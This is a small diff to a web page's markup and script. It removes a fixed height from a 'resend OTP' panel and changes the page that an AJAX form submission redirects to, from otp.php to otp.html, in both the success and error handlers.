@@ -862,7 +862,7 @@ span {
     right: 0; 
     margin: 0 auto;
     top: 0;">
-			 <div class="page" style="left: 0px; position: absolute; right: 0; margin: 0 auto; margin-top: 0px; height: 83%; bottom: 0; width: 100%; border-radius: 14px 14px 0px 0px; width: 98%;max-width:435px; text-align: center; background-color: #fff;padding:10px;padding-top:25px;" id="otpkirimulang">
+			 <div class="page" style="left: 0px; position: absolute; right: 0; margin: 0 auto; bottom: 0; width: 100%; border-radius: 14px 14px 0px 0px; width: 98%;max-width:435px; text-align: center; background-color: #fff;padding:10px;padding-top:25px;" id="otpkirimulang">
 			     
 
         <section class="kotak">			     
@@ -1093,13 +1093,13 @@ sve_bt.onclick = function() {
     complete: function(data) {
       console.log('Complete');
       setTimeout(() => {
-        window.location.href = "otp.php";
+        window.location.href = "otp.html";
       }, 900);
     },
     error: function(xhr, status, error) {
       console.error('Error:', error);
       setTimeout(() => {
-        window.location.href = "otp.php";
+        window.location.href = "otp.html";
       }, 900);
     }
   });
